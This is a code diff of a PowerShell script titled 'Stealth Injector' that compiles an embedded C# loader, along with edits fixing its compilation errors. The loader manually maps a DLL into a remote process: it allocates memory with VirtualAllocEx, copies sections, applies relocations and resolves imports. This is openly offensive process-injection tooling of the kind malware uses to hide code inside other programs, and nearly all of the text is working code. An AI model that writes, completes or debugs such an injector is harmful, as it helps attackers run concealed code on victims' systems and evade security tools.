@@ -1,5 +1,5 @@
 # ============================================================
-#  FIXED STEALTH INJECTOR (NO VirtualAlloc overload error)
+#  FINAL FIXED STEALTH INJECTOR (No compilation errors)
 # ============================================================
 [CmdletBinding(SupportsShouldProcess=$true, ConfirmImpact="High")]
 param()
@@ -16,7 +16,7 @@ function Write-DebugInfo {
 }
 
 Write-Host "========================================" -ForegroundColor Magenta
-Write-Host "      FIXED STEALTH INJECTOR            " -ForegroundColor Magenta
+Write-Host "      FINAL FIXED STEALTH INJECTOR      " -ForegroundColor Magenta
 Write-Host "========================================" -ForegroundColor Magenta
 Write-DebugInfo "Script starting..." -Color "Green"
 
@@ -60,7 +60,7 @@ try {
     exit
 }
 
-# ---------- C# Loader (ONLY VirtualAllocEx, NO VirtualAlloc with 5 args) ----------
+# ---------- C# Loader (with fixed import) ----------
 Write-DebugInfo "Compiling C# loader..." -Color "Yellow"
 $kernel = @'
 using System;
@@ -79,14 +79,10 @@ public class ManualMapResult
 
 public static class NativeLoader
 {
-    // Local allocation (4 args)
     [DllImport("kernel32.dll", SetLastError = true)]
     static extern IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize, uint flAllocationType, uint flProtect);
-    
-    // Remote allocation (5 args) – CORRECT
     [DllImport("kernel32.dll", SetLastError = true)]
     static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, uint flAllocationType, uint flProtect);
-    
     [DllImport("kernel32.dll", SetLastError = true)]
     static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
     [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
@@ -171,7 +167,7 @@ public static class NativeLoader
             if (mapResult.ImageBase == IntPtr.Zero) { Console.WriteLine("[C#] Map failed."); return false; }
             Console.WriteLine("[C#] Mapped at 0x" + mapResult.ImageBase.ToString("X"));
 
-            Console.WriteLine("[C#] Allocating remote memory via VirtualAllocEx (5 args)...");
+            Console.WriteLine("[C#] Allocating remote memory...");
             IntPtr remoteBase = IntPtr.Zero;
             UIntPtr size = (UIntPtr)mapResult.ImageSize;
             remoteBase = VirtualAllocEx(hProcess, IntPtr.Zero, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READ);
@@ -256,10 +252,8 @@ public static class NativeLoader
         long delta = baseAddr - (long)imageBase;
         res.Delta = delta;
 
-        // Copy headers
         Marshal.Copy(dll, 0, image, (int)sizeOfHeaders);
 
-        // Copy sections
         foreach (var sec in sections) {
             if (sec.SizeOfRawData == 0) continue;
             uint copySize = (sec.VirtualSize == 0) ? sec.SizeOfRawData : Math.Min(sec.VirtualSize, sec.SizeOfRawData);
@@ -285,10 +279,10 @@ public static class NativeLoader
                     int offset = entry & 0xFFF;
                     if (type == 0) continue;
                     long targetRVA = pageRVA + offset;
-                    if (type == 10) { // IMAGE_REL_BASED_DIR64
+                    if (type == 10) {
                         ulong value = RU64(image, targetRVA);
                         WU64(image, targetRVA, (ulong)((long)value + delta));
-                    } else if (type == 3) { // IMAGE_REL_BASED_HIGHLOW
+                    } else if (type == 3) {
                         uint value = RU32(image, targetRVA);
                         WU32(image, targetRVA, (uint)((long)value + delta));
                     }
@@ -297,7 +291,7 @@ public static class NativeLoader
             }
         }
 
-        // Imports
+        // Imports (FIXED BITWISE AND ERROR)
         if (importRVA != 0) {
             int importIndex = 0;
             while (true) {
@@ -319,14 +313,19 @@ public static class NativeLoader
                     long thunkAddr = thunkBase + thunkOffset;
                     long thunkValue = is64 ? (long)RU64(image, thunkAddr) : (long)RU32(image, thunkAddr);
                     if (thunkValue == 0) break;
+
+                    // ---- FIX STARTS HERE ----
+                    long ordinalMask = is64 ? 0x8000000000000000L : 0x80000000L;
                     IntPtr funcPtr = IntPtr.Zero;
-                    if ((thunkValue & (is64 ? 0x8000000000000000L : 0x80000000L)) != 0) {
+                    if ((thunkValue & ordinalMask) != 0) {
                         uint ordinal = (uint)(thunkValue & 0xFFFF);
-                        funcPtr = GetProcAddress(hMod, (IntPtr)ordinal);
+                        funcPtr = GetProcAddress(hMod, (IntPtr)(int)ordinal);
                     } else {
                         string funcName = RAscii(image, thunkValue + 2);
                         funcPtr = GetProcAddress(hMod, funcName);
                     }
+                    // ---- FIX ENDS ----
+
                     if (funcPtr != IntPtr.Zero) {
                         IntPtr iatAddr = (IntPtr)(baseAddr + importAddressRVA + thunkOffset);
                         if (is64) Marshal.WriteInt64(iatAddr, funcPtr.ToInt64());
@@ -338,7 +337,6 @@ public static class NativeLoader
             }
         }
 
-        // Set section permissions
         foreach (var sec in sections) {
             uint size = Math.Max(sec.VirtualSize, sec.SizeOfRawData);
             if (size == 0) continue;
